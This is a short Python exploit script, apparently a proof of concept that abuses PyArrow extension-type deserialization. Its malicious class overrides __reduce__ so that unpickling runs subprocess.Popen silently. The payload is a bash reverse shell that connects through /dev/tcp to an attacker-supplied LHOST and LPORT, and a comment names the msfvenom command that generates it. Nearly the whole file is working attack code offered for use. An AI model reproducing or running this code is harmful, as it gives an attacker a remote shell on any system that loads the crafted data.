import functools
import subprocess
from typing import List

import pyarrow as pa

# Simple bash reverse shell: $ msfvenom -p cmd/unix/reverse_bash LHOST=1.3.3.7 LPORT=1337
REVSHELL_PAYLOAD = [
    "bash",
    "-c",
    "0<&51-;exec 51<>/dev/tcp/{LHOST}/{LPORT};sh <&51 >&51 2>&51"
]


class MaliciousStringType(pa.PyExtensionType):
    def __init__(self, payload: List[str]):
        self._payload = payload
        pa.PyExtensionType.__init__(self, pa.string())

    def __reduce__(self):
        return (
            functools.partial(
                subprocess.Popen,
                start_new_session=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            ),
            (self._payload, ),
            1
        )
